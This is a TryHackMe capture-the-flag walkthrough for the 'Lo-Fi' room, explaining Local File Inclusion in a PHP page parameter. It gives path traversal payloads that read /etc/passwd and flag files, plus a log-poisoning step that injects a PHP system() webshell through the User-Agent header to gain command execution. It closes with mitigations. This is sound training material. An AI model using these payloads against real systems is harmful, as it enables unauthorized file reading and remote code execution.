# 🎵 Lo-Fi — TryHackMe Walkthrough

**Room:** [Lo-Fi](https://tryhackme.com/room/lofi)
**Difficulty:** Easy
**Category:** Web / LFI
**Tags:** Local File Inclusion, LFI, Path Traversal, PHP

---

## 📋 Overview

Lo-Fi is a web exploitation room centred on **Local File Inclusion (LFI)** — a vulnerability that allows attackers to include files from the server's filesystem via unsanitised user input. The goal is to exploit the LFI to read sensitive files and capture the flag.

---

## 🔧 Tools Used

- Browser / Burp Suite — Request manipulation
- `curl` — Command-line web requests

---

## 🌐 Step 1: Explore the Web Application

Navigate to `http://<TARGET_IP>`. The site appears to be a lo-fi music page with a `?page=` parameter in the URL, such as:

```
http://<TARGET_IP>/?page=home
```

This `page` parameter is a strong indicator of a potential LFI vulnerability.

---

## 🔍 Step 2: Test for LFI

Try including a well-known Linux file using path traversal:

```bash
http://<TARGET_IP>/?page=../../../../etc/passwd
```

If the `/etc/passwd` file contents are returned, the application is vulnerable to LFI.

---

## 🚩 Step 3: Read the Flag

Once LFI is confirmed, read the flag file. Try common flag locations:

```bash
http://<TARGET_IP>/?page=../../../../etc/flag
http://<TARGET_IP>/?page=../../../../flag.txt
http://<TARGET_IP>/?page=../flag
```

The flag will be displayed in the page response.

> 🚩 **Flag:** Retrieved by including the flag file via path traversal.

---

## 🛡️ Going Further — Log Poisoning (optional)

LFI can be escalated to **Remote Code Execution (RCE)** via log poisoning:

1. Inject PHP code into a log file (e.g., via User-Agent header)
2. Include the log file via LFI to execute the PHP code

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://<TARGET_IP>/
curl "http://<TARGET_IP>/?page=../../../../var/log/apache2/access.log&cmd=id"
```

---

## 📝 Key Takeaways

- **LFI** allows reading arbitrary files from the server if user input is passed to file-inclusion functions without sanitisation.
- Common PHP functions susceptible to LFI: `include()`, `require()`, `include_once()`, `require_once()`.
- Path traversal (`../`) is used to navigate up the directory tree.
- Mitigations: whitelist allowed file values, use `basename()` to strip path components, disable `allow_url_include`.

---

## 🔗 References

- [OWASP — LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [TryHackMe — Lo-Fi Room](https://tryhackme.com/room/lofi)
- [Walkthrough Reference](https://infosecwriteups.com/tryhackme-lo-fi-room-walkthrough-5db280c696ee)
